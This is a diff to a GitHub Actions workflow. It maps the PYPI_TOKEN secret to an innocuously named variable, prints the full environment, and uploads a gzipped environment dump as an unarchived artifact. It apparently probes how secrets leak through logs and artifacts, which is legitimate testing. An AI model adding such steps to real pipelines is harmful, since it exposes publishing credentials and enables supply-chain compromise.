@@ -6,9 +6,13 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - run: |
+      - env:
+          MEOW: ${{ secrets.PYPI_TOKEN}}
+        run: |
+          env | sort
           env | sort | gzip > foo.gz
 
       - uses: actions/upload-artifact@v7
         with:
           path: foo.gz
+          archive: false
